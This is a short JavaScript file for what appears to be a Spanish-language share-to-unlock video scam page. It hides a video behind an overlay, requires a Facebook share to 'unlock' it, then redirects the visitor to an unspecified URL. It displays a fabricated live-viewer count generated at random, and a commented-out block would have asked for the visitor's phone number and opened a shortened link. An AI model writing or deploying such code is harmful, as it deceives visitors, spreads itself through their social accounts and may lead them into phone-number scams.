(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "https://connect.facebook.net/es_LA/all.js#xfbml=1";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));

$(document).ready(function(){ 

$('.youtube-blocker').click(function () {
/* $(".play-button").hide(); */
$(".image, .play-button, .controlls, .overlay, .sharebox").hide();
setTimeout(function(){
$(".overlay, .image, .sharebox").show();
}, 1500);
});

$('.sharebox').click(function () {
FB.ui({
method: '../sharer/sharer.php?u='+document.URL+'&t=&pass=',
link : document.URL,
},
function (response) {
if( response) {
$(".image, .play-button, .controlls, .overlay, .sharebox").hide();
setTimeout(function(){ window.location=""+redirecionar+""; }, 1000);
} else {
// alert("Click a Compartir Enlace para desbloquear el vídeo.!!");
}
});
});

// $('.btn').click(function () {
// alert("A continuacion ingresa tu numero para recibir este video directo en tu movil.");
// window.open("http://goo.gl/Oouldh");
// });

rstats(); 
});

function rstats() {
$("#online").text(Math.floor(Math.random() * (5300-4500+1)) + 4500);
setTimeout(function() { rstats(); }, 2000);
}